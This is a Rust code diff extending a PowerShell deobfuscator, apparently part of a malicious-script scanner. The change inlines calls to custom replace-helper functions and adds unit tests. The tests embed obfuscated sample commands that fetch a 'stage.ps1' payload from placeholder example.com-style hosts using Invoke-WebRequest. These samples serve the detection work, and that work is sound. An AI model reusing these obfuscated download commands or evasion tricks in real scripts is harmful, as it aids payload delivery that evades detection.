@@ -952,6 +952,14 @@ static PS_LITERAL_SUBSTRING_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
 });
 
 #[allow(clippy::expect_used)]
+static PS_LITERAL_REPLACE_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r#"(?is)(?:\breturn\s+)?\$([A-Za-z_][A-Za-z0-9_]*)\s*-(?:[ic])?replace\s+\$([A-Za-z_][A-Za-z0-9_]*)\s*,\s*\$([A-Za-z_][A-Za-z0-9_]*)"#,
+    )
+    .expect("ps literal replace extractor body regex")
+});
+
+#[allow(clippy::expect_used)]
 static PS_GZIP_FUNCTION_GETSTRING_VAR_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
         r#"(?is)\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*\[(?:System\.)?(?:Text\.)?Encoding\]::(?:UTF8|ASCII|Unicode|UTF7|BigEndianUnicode|UTF32)\.GetString\s*\(\s*\(*\s*([A-Za-z_][A-Za-z0-9_]*)\s*\(\s*\(*\s*\[(?:System\.)?Convert\]::FromBase64String\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)\s*\)*\s*\)\s*\)*\s*\)\s*(?:\.TrimEnd\s*\([^)]*\))?"#,
@@ -2870,6 +2878,9 @@ fn expand_space_concat(text: &str) -> String {
     let matches: Vec<(usize, usize, String)> = SPACE_CONCAT_RE
         .find_iter(text)
         .filter_map(|m| {
+            if !is_string_concat_start(text, m.start()) {
+                return None;
+            }
             let s = m.as_str();
             // Extract all single-quoted parts
             let parts_re = regex::Regex::new(r"'([^']*)'").ok()?;
@@ -3182,6 +3193,43 @@ fn expand_literal_substring_extractor_calls(text: &str) -> String {
     out
 }
 
+fn expand_literal_replace_extractor_calls(text: &str) -> String {
+    let lower = text.to_ascii_lowercase();
+    if !lower.contains("function ") || !lower.contains("replace") || !text.contains('\'') {
+        return text.to_string();
+    }
+
+    let mut out = text.to_string();
+    for (name, params, body) in literal_substring_extractor_defs(text).into_iter().take(32) {
+        let Some(caps) = PS_LITERAL_REPLACE_EXTRACTOR_BODY_RE.captures(&body) else {
+            continue;
+        };
+        let Some(value_var) = caps.get(1).map(|m| m.as_str()) else {
+            continue;
+        };
+        let Some(needle_var) = caps.get(2).map(|m| m.as_str()) else {
+            continue;
+        };
+        let Some(repl_var) = caps.get(3).map(|m| m.as_str()) else {
+            continue;
+        };
+
+        let param_index = parse_ps_function_param_indices(&params);
+        let Some(value_idx) = param_index.get(&value_var.to_ascii_lowercase()).copied() else {
+            continue;
+        };
+        let Some(needle_idx) = param_index.get(&needle_var.to_ascii_lowercase()).copied() else {
+            continue;
+        };
+        let Some(repl_idx) = param_index.get(&repl_var.to_ascii_lowercase()).copied() else {
+            continue;
+        };
+
+        out = inline_ps_literal_replace_calls(&out, &name, value_idx, needle_idx, repl_idx);
+    }
+    out
+}
+
 fn literal_substring_extractor_defs(text: &str) -> Vec<(String, String, String)> {
     let bytes = text.as_bytes();
     let mut defs = Vec::new();
@@ -3350,6 +3398,96 @@ fn inline_ps_literal_substring_calls(
         }
 
         let replacement = format!("'{}'", value[start..end].replace('\'', "''"));
+        matches.push((call_start, call_end, replacement));
+        search_from = call_end;
+        match_count += 1;
+    }
+
+    let mut out = text.to_string();
+    for (start, end, replacement) in matches.into_iter().rev() {
+        out.replace_range(start..end, &replacement);
+    }
+    out
+}
+
+fn inline_ps_literal_replace_calls(
+    text: &str,
+    name: &str,
+    value_idx: usize,
+    needle_idx: usize,
+    repl_idx: usize,
+) -> String {
+    let lower = text.to_ascii_lowercase();
+    let needle_name = name.to_ascii_lowercase();
+    let bytes = text.as_bytes();
+    let mut matches = Vec::new();
+    let mut search_from = 0;
+    let mut match_count = 0;
+
+    while match_count < 128 {
+        let Some(rel) = lower[search_from..].find(&needle_name) else {
+            break;
+        };
+        let call_start = search_from + rel;
+        let end_name = call_start + name.len();
+        if is_ident_byte(bytes.get(call_start.wrapping_sub(1)).copied())
+            || is_ident_byte(bytes.get(end_name).copied())
+        {
+            search_from = end_name;
+            continue;
+        }
+
+        let mut pos = skip_ascii_ws(bytes, end_name);
+        let parenthesized = bytes.get(pos) == Some(&b'(');
+        if parenthesized {
+            pos = skip_ascii_ws(bytes, pos + 1);
+        }
+        let Some((first_end, first)) = parse_ps_static_quoted_literal(text, pos) else {
+            search_from = end_name;
+            continue;
+        };
+        if first.len() > 8192 {
+            search_from = first_end;
+            continue;
+        }
+        pos = skip_ps_arg_separator(bytes, first_end, parenthesized);
+        let Some((second_end, second)) = parse_ps_static_quoted_literal(text, pos) else {
+            search_from = first_end;
+            continue;
+        };
+        pos = skip_ps_arg_separator(bytes, second_end, parenthesized);
+        let Some((third_end, third)) = parse_ps_static_quoted_literal(text, pos) else {
+            search_from = second_end;
+            continue;
+        };
+        let mut call_end = third_end;
+        if parenthesized {
+            let after = skip_ascii_ws(bytes, call_end);
+            if bytes.get(after) != Some(&b')') {
+                search_from = third_end;
+                continue;
+            }
+            call_end = after + 1;
+        }
+
+        let args = [&first, &second, &third];
+        if value_idx >= args.len() || needle_idx >= args.len() || repl_idx >= args.len() {
+            search_from = call_end;
+            continue;
+        }
+        let value = args[value_idx];
+        let needle = args[needle_idx];
+        let repl = args[repl_idx];
+        if needle.is_empty() {
+            search_from = call_end;
+            continue;
+        }
+        let replaced = value.replace(needle, repl);
+        if replaced.len() > 8192 {
+            search_from = call_end;
+            continue;
+        }
+        let replacement = format!("'{}'", replaced.replace('\'', "''"));
         matches.push((call_start, call_end, replacement));
         search_from = call_end;
         match_count += 1;
@@ -3838,6 +3976,7 @@ fn expand_obfuscation(text: &str) -> String {
             }
             if signals.replace {
                 out = expand_ps_replace(&out);
+                out = expand_literal_replace_extractor_calls(&out);
             }
             if signals.dot_replace {
                 out = expand_ps_dot_replace(&out);
@@ -5868,9 +6007,28 @@ fn line_has_powershell_payload_flag(line: &str) -> bool {
 #[cfg(test)]
 mod literal_substring_extractor_tests {
     use super::{
+        expand_doubled_quote_literals, expand_literal_replace_extractor_calls,
         expand_literal_substring_extractor_calls, literal_substring_extractor_defs,
         PS_LITERAL_SUBSTRING_EXTRACTOR_BODY_RE,
     };
+
+    #[test]
+    fn doubled_quote_expansion_preserves_empty_single_quoted_argument() {
+        let text = "Clean 'abc' '~' ''";
+
+        let out = expand_doubled_quote_literals(text);
+
+        assert_eq!(out, text);
+    }
+
+    #[test]
+    fn space_concat_does_not_merge_function_call_arguments() {
+        let text = "Clean 'abc' '~' ''";
+
+        let out = super::expand_space_concat(text);
+
+        assert_eq!(out, text);
+    }
 
     #[test]
     fn literal_substring_extractor_call_is_rewritten() {
@@ -5891,6 +6049,21 @@ mod literal_substring_extractor_tests {
         assert!(
             out.contains("'Invoke-WebRequest -Uri https://ps-extractor-call.example/stage.ps1'"),
             "substring extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_replace_extractor_call_is_rewritten() {
+        let text = r#"function Clean($value,$needle,$replacement) {
+  return $value -replace $needle,$replacement
+}
+Clean 'I~n~v~o~k~e~-~W~e~b~R~e~q~u~e~s~t~ ~-~U~r~i~ ~h~t~t~p~s~:~/~/~p~s~-~r~e~p~l~a~c~e~-~e~x~t~r~a~c~t~o~r~.~e~x~a~m~p~l~e~/~s~t~a~g~e~.~p~s~1' '~' ''"#;
+
+        let out = expand_literal_replace_extractor_calls(text);
+
+        assert!(
+            out.contains("'Invoke-WebRequest -Uri https://ps-replace-extractor.example/stage.ps1'"),
+            "replace extractor call was not rewritten:\n{out}"
         );
     }
 }
